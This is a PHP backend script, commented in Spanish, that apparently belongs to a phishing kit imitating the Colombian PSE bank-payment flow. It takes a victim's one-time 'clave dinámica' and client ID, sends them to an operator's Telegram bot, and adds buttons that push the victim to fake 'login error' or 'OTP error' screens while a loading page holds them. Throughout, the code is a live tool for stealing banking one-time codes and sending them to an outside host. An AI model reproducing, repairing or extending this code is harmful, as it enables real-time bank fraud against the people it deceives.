<?php
// No necesitas iniciar session_start() aquí si no usas variables $_SESSION
// session_start(); 

// Estos includes están correctos. $conn es un objeto PDO.
include '../../../../assets/config/conexion.php';
$config = include '../../../../assets/config/config.php';

// Función para escapar caracteres especiales en MarkdownV2 (Sin cambios)
function escapeMarkdownV2($text) {
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cliente_id = $_POST['cliente_id']; // ID del cliente
    $claveDinamica = $_POST['claveDinamica']; // Clave dinámica ingresada

    if (empty($cliente_id) || empty($claveDinamica)) {
        die("Error: Todos los campos son obligatorios.");
    }

    // --- SECCIÓN DE BASE DE DATOS ADAPTADA A PDO ---
    
    $estado = 5; // Estado: Clave dinámica ingresada
    $sql = "UPDATE pse SET estado = ? WHERE id = ?";
    
    try {
        // 1. Preparamos la consulta
        $stmt = $conn->prepare($sql);
        
        // 2. Ejecutamos la consulta pasando los valores en un array.
        //    Esto reemplaza a bind_param() y execute().
        //    El orden importa: [valor para el 1er ?, valor para el 2do ?]
        $stmt->execute([$estado, $cliente_id]);

        // Si llegamos aquí, la actualización fue exitosa.

        // --- FIN DE LA SECCIÓN ADAPTADA ---


        // Enviar datos a Telegram (Sin cambios)
        $botToken = $config['telegram']['bot_token'];
        $chatId = $config['telegram']['chat_id'];
        $baseUrl = $config['base_url'];
        $security_key = 'tu_clave_secreta_aqui'; // Define tu clave de seguridad aquí

        $message = "🔐 *Clave Dinámica Ingresada*\n\n"
                 . "📱 *ID Cliente:* `" . escapeMarkdownV2($cliente_id) . "`\n"
                 . "🔑 *Clave Dinámica:* `" . escapeMarkdownV2($claveDinamica) . "`";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"]
                ],
                [
                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key"]
                ]
            ]
        ];

        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'MarkdownV2',
            'reply_markup' => json_encode($keyboard)
        ];

        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
            ]
        ];

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === FALSE) {
            $error = error_get_last();
            file_put_contents('telegram_debug_log.txt', "Error: " . print_r($error, true), FILE_APPEND);
            die('Error al enviar mensaje a Telegram');
        }

        // Redirigir a la página cargando.php con el ID del cliente (Sin cambios)
        header("Location: ../cargando.php?id=" . $cliente_id);
        exit();

    } catch (PDOException $e) {
        // 3. Manejo de errores de PDO
        //    Esto reemplaza a "echo $stmt->error"
        error_log("Error al actualizar BBDD: " . $e->getMessage());
        die("Error al actualizar el estado. Por favor, intente más tarde.");
    }
    
    // 4. No necesitas $stmt->close() ni $conn->close() con PDO de esta manera.
    //    PHP se encarga de cerrar la conexión al final del script.
}
?>